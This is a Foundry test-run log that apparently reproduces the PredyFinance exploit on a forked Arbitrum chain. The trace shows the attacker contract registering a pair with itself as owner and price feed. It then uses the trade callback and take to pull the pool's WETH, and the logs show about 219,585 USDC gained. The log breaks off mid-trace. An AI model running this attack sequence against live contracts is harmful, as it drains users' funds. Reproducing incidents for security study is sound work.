Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.23s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-05/PredyFinance_exp.sol:24:5:
   |
24 |     IERC20 USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:3064:1:
     |
3064 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-05/PredyFinance_exp.sol:25:5:
   |
25 |     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2024-05/PredyFinance_exp.sol:82:9:
   |
82 |         IPredyPool.TradeResult memory tradeResult
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2024-05/PredyFinance_exp.sol:91:5:
   |
91 |     function getSqrtPrice() external view returns (uint256) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 461.54ms (1.83ms CPU time)

Ran 1 test for src/test/2024-05/PredyFinance_exp.sol:PredyFinance
[PASS] testExploit() (gas: 2703354)
Logs:
  Attacker USDC Balance Before exploit: 0.000000
  Attacker USDC Balance After exploit: 219585.737814

Traces:
  [19452] PredyFinance::setUp()
    ├─ [0] VM::createSelectFork("arbitrum", 211107441 [2.111e8])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(USDC: [0xaf88d065e77c8cC2239327C5EDb3A432268e5831], "USDC")
    │   └─ ← [Return]
    ├─ [0] VM::label(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], "PredyPool")
    │   └─ ← [Return]
    └─ ← [Stop]

  [2968554] PredyFinance::testExploit()
    ├─ [10281] USDC::symbol() [staticcall]
    │   ├─ [3081] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::symbol() [delegatecall]
    │   │   └─ ← [Return] "USDC"
    │   └─ ← [Return] "USDC"
    ├─ [3250] USDC::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3043] USDC::decimals() [staticcall]
    │   ├─ [2381] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance Before exploit", val: 0, decimals: 6)
    ├─ [27341] USDC::approve(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [26673] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::approve(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  storage changes:
    │   │   │   @ 0x2650628399afba46c0d5bc7111fbfc1f83cb3f80ebd920b9b4b03e4e4772e72a: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [31808] WETH::approve(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [24562] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::approve(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  storage changes:
    │   │   │   @ 0xb02242e57e19c64392abbe71b4cdd3bc58f69863ac42fb4f1976e015ccd1f7eb: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [2064742] PredyPool::registerPair(AddPairParams({ marginId: 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, poolOwner: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, uniswapPool: 0xC6962004f452bE9203591991D15f6b388e09E8D0, priceFeed: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, whitelistEnabled: false, fee: 0, assetRiskParams: AssetRiskParams({ riskRatio: 100000001 [1e8], debtRiskRatio: 0, rangeSize: 1000, rebalanceThreshold: 500, minSlippage: 1005000 [1.005e6], maxSlippage: 1050000 [1.05e6] }), quoteIrmParams: IRMParams({ baseRate: 10000000000000000 [1e16], kinkRate: 900000000000000000 [9e17], slope1: 500000000000000000 [5e17], slope2: 1000000000000000000 [1e18] }), baseIrmParams: IRMParams({ baseRate: 10000000000000000 [1e16], kinkRate: 900000000000000000 [9e17], slope1: 500000000000000000 [5e17], slope2: 1000000000000000000 [1e18] }) }))
    │   ├─ [2059697] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::registerPair(AddPairParams({ marginId: 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, poolOwner: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, uniswapPool: 0xC6962004f452bE9203591991D15f6b388e09E8D0, priceFeed: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, whitelistEnabled: false, fee: 0, assetRiskParams: AssetRiskParams({ riskRatio: 100000001 [1e8], debtRiskRatio: 0, rangeSize: 1000, rebalanceThreshold: 500, minSlippage: 1005000 [1.005e6], maxSlippage: 1050000 [1.05e6] }), quoteIrmParams: IRMParams({ baseRate: 10000000000000000 [1e16], kinkRate: 900000000000000000 [9e17], slope1: 500000000000000000 [5e17], slope2: 1000000000000000000 [1e18] }), baseIrmParams: IRMParams({ baseRate: 10000000000000000 [1e16], kinkRate: 900000000000000000 [9e17], slope1: 500000000000000000 [5e17], slope2: 1000000000000000000 [1e18] }) })) [delegatecall]
    │   │   ├─ [2053417] 0x2D756f7912B5c61f35ca3E5b310C7C133A90977c::ac826482(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003e00000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab10000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000c6962004f452be9203591991d15f6b388e09e8d00000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e800000000000000000000000000000000000000000000000000000000000001f400000000000000000000000000000000000000000000000000000000000f55c80000000000000000000000000000000000000000000000000000000000100590000000000000000000000000000000000000000000000000002386f26fc100000000000000000000000000000000000000000000000000000c7d713b49da000000000000000000000000000000000000000000000000000006f05b59d3b200000000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000002386f26fc100000000000000000000000000000000000000000000000000000c7d713b49da000000000000000000000000000000000000000000000000000006f05b59d3b200000000000000000000000000000000000000000000000000000de0b6b3a7640000) [delegatecall]
    │   │   │   ├─ [266] 0xC6962004f452bE9203591991D15f6b388e09E8D0::token0() [staticcall]
    │   │   │   │   └─ ← [Return] WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]
    │   │   │   ├─ [308] 0xC6962004f452bE9203591991D15f6b388e09E8D0::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDC: [0xaf88d065e77c8cC2239327C5EDb3A432268e5831]
    │   │   │   ├─ [251] 0xC6962004f452bE9203591991D15f6b388e09E8D0::fee() [staticcall]
    │   │   │   │   └─ ← [Return] 500
    │   │   │   ├─ [2666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], USDC: [0xaf88d065e77c8cC2239327C5EDb3A432268e5831], 500) [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000c6962004f452be9203591991d15f6b388e09e8d0
    │   │   │   ├─ [266] 0xC6962004f452bE9203591991D15f6b388e09E8D0::token0() [staticcall]
    │   │   │   │   └─ ← [Return] WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]
    │   │   │   ├─ [266] 0xC6962004f452bE9203591991D15f6b388e09E8D0::token0() [staticcall]
    │   │   │   │   └─ ← [Return] WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]
    │   │   │   ├─ [308] 0xC6962004f452bE9203591991D15f6b388e09E8D0::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDC: [0xaf88d065e77c8cC2239327C5EDb3A432268e5831]
    │   │   │   ├─ [3785] WETH::name() [staticcall]
    │   │   │   │   ├─ [3039] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::name() [delegatecall]
    │   │   │   │   │   └─ ← [Return] "Wrapped Ether"
    │   │   │   │   └─ ← [Return] "Wrapped Ether"
    │   │   │   ├─ [3850] WETH::symbol() [staticcall]
    │   │   │   │   ├─ [3104] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::symbol() [delegatecall]
    │   │   │   │   │   └─ ← [Return] "WETH"
    │   │   │   │   └─ ← [Return] "WETH"
    │   │   │   ├─ [3076] WETH::decimals() [staticcall]
    │   │   │   │   ├─ [2336] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::decimals() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   └─ ← [Return] 18
    │   │   │   ├─ [686767] → new <unknown>@0x3Dd636919d4180B59d9225370CB84F1BA849aba2
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 1: 0 → 0x705745544800000000000000000000000000000000000000000000000000000a
    │   │   │   │   │   @ 0: 0 → 0x5072656479362d537570706c792d577261707065642045746865720000000036
    │   │   │   │   └─ ← [Return] 3195 bytes of code
    │   │   │   ├─ [3729] USDC::name() [staticcall]
    │   │   │   │   ├─ [3061] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::name() [delegatecall]
    │   │   │   │   │   └─ ← [Return] "USD Coin"
    │   │   │   │   └─ ← [Return] "USD Coin"
    │   │   │   ├─ [1781] USDC::symbol() [staticcall]
    │   │   │   │   ├─ [1081] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::symbol() [delegatecall]
    │   │   │   │   │   └─ ← [Return] "USDC"
    │   │   │   │   └─ ← [Return] "USDC"
    │   │   │   ├─ [1043] USDC::decimals() [staticcall]
    │   │   │   │   ├─ [381] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::decimals() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   └─ ← [Return] 6
    │   │   │   ├─ [686767] → new <unknown>@0x0b9F4DFb6eB2A8c2F26E98C4538422E6b8C4599F
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 1: 0 → 0x705553444300000000000000000000000000000000000000000000000000000a
    │   │   │   │   │   @ 0: 0 → 0x5072656479362d537570706c792d55534420436f696e0000000000000000002c
    │   │   │   │   └─ ← [Return] 3195 bytes of code
    │   │   │   ├─  emit topic 0: 0x2629b119f06606374582e6c88170c0a494bde68b5e739e3afa8f07c29159634d
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000005f5e101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e800000000000000000000000000000000000000000000000000000000000001f400000000000000000000000000000000000000000000000000000000000f55c80000000000000000000000000000000000000000000000000000000000100590
    │   │   │   ├─ emit IRMParamsUpdated(: 3, : (10000000000000000 [1e16], 900000000000000000 [9e17], 500000000000000000 [5e17], 1000000000000000000 [1e18]), : (10000000000000000 [1e16], 900000000000000000 [9e17], 500000000000000000 [5e17], 1000000000000000000 [1e18]))
    │   │   │   ├─  emit topic 0: 0xbdf0e5eca458f21fa7f881795ad7abfa4ba00bf6ef9fd52b07fcd6d78e557de3
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000300000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab1000000000000000000000000c6962004f452be9203591991d15f6b388e09e8d0
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3167: 0 → 0x0000000000000000000000000b9f4dfb6eb2a8c2f26e98c4538422e6b8c4599f
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3187: 0 → 0x0000000000000000000000017fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3171: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3174: 0 → 0x0000000000000000000000000000000000000000000000000000000005f5e101
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3175: 0 → 0x00000000000000000000000000000010059000000000000f55c80001f40003e8
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3159: 0 → 0x0000000000000000000000003dd636919d4180b59d9225370cb84f1ba849aba2
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3161: 0 → 0x0000000000000000000000000000000000000000000000000c7d713b49da0000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3157: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c315d: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3163: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3155: 0 → 3
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3162: 0 → 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c316b: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c316e: 0 → 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3170: 0 → 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3158: 0 → 0x00000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab1
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3160: 0 → 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3188: 0 → 0x00000000000000000000000000000000000000000000000000000000664315a8
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3166: 0 → 0x000000000000000000000000af88d065e77c8cc2239327c5edb3a432268e5831
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3156: 0 → 0x00000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab1
    │   │   │   │   @ 52: 3 → 4
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c316f: 0 → 0x0000000000000000000000000000000000000000000000000c7d713b49da0000
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3176: 0 → 0x0000000000000003e8fffc18c6962004f452be9203591991d15f6b388e09e8d0
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000003
    │   │   └─ ← [Return] 3
    │   └─ ← [Return] 3
    ├─ [678119] PredyPool::trade(TradeParams({ pairId: 3, vaultId: 0, tradeAmount: 0, tradeAmountSqrt: 0, extraData: 0x }), 0x)
    │   ├─ [677580] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::trade(TradeParams({ pairId: 3, vaultId: 0, tradeAmount: 0, tradeAmountSqrt: 0, extraData: 0x }), 0x) [delegatecall]
    │   │   ├─  emit topic 0: 0xe69753e50bf059b3600feb46679d77e5d58780bbf62f4d6ec6dcfac1bb93774e
    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000b90000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab10000000000000000000000000000000000000000000000000000000000000003
    │   │   ├─ [552535] 0xdE12Aa19734DaCbd34CeDdE14F8290a70A85537f::95629036(000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [118261] 0x8D9Eb354B3858E9E93be3ffc8b2A98732804383C::95629036(000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   ├─ [2696] 0xC6962004f452bE9203591991D15f6b388e09E8D0::slot0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 4276635204314126442437482 [4.276e24], -196549 [-1.965e5], 4294, 8000, 8000, 0, true
    │   │   │   │   ├─ [696] 0xC6962004f452bE9203591991D15f6b388e09E8D0::slot0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 4276635204314126442437482 [4.276e24], -196549 [-1.965e5], 4294, 8000, 8000, 0, true
    │   │   │   │   ├─ [2364] 0xC6962004f452bE9203591991D15f6b388e09E8D0::feeGrowthGlobal0X128() [staticcall]
    │   │   │   │   │   └─ ← [Return] 192593815485385748126009195732665966214062 [1.925e41]
    │   │   │   │   ├─ [2388] 0xC6962004f452bE9203591991D15f6b388e09E8D0::feeGrowthGlobal1X128() [staticcall]
    │   │   │   │   │   └─ ← [Return] 499645742611065231050067406786537 [4.996e32]
    │   │   │   │   ├─ [9199] 0xC6962004f452bE9203591991D15f6b388e09E8D0::ticks(-1000) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0, 0, 0, 0, false
    │   │   │   │   ├─ [9199] 0xC6962004f452bE9203591991D15f6b388e09E8D0::ticks(1000) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0, 0, 0, 0, false
    │   │   │   │   ├─  emit topic 0: 0xd6b5c308a56f1f33cb6d586d7f76c5e6fbf851f46dc71f0910aec5855b2c885c
    │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000003
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  emit topic 0: 0xfdb6fb8e49892b73d8187dbef8b7b09543994120ac9d5bf868f3d6baba1dba0d
    │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000003
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  emit topic 0: 0xfdb6fb8e49892b73d8187dbef8b7b09543994120ac9d5bf868f3d6baba1dba0d
    │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000003
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0xe40e4f92289c9123a4a1546a3c1a80bc2c52a1392bd4deacedd00c7e7ba2af5c: 0 → 0x00000000000000000000000000000000000000000000000000000003e8fffc18
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001474e81327fd11f2dc5e47998da28d350000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000485dd13b7f8e8eb26f0c9ba84363
    │   │   │   ├─ [421] PredyFinance::getSqrtPrice() [staticcall]
    │   │   │   │   └─ ← [Return] 40000000000 [4e10]
    │   │   │   ├─ [3296] WETH::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   │   │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   ├─ [3250] USDC::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   │   │   │   ├─ [2553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   ├─ [267331] PredyFinance::predyTradeAfterCallback(TradeParams({ pairId: 3, vaultId: 185, tradeAmount: 0, tradeAmountSqrt: 0, extraData: 0x }), TradeResult({ payoff: Payoff({ perpEntryUpdate: 0, sqrtEntryUpdate: 0, sqrtRebalanceEntryUpdateUnderlying: 0, sqrtRebalanceEntryUpdateStable: 0, perpPayoff: 0, sqrtPayoff: 0 }), vaultId: 185, fee: 0, minMargin: 0, averagePrice: 27191573388027350797162890363563838773 [2.719e37], sqrtTwap: 40000000000 [4e10], sqrtPrice: 1467766464872793135688797347398499 [1.467e33] }))
    │   │   │   │   ├─ [1296] WETH::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   ├─ [40624] PredyPool::take(true, PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19])
    │   │   │   │   │   ├─ [40163] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::take(true, PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19]) [delegatecall]
    │   │   │   │   │   │   ├─ [28900] WETH::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   ├─ [28154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], to: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 0xe8d16bce44843424e5de4332ad956609f7bda010c07b6e7438ca015cfddbbfdf: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   ├─ [1296] WETH::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
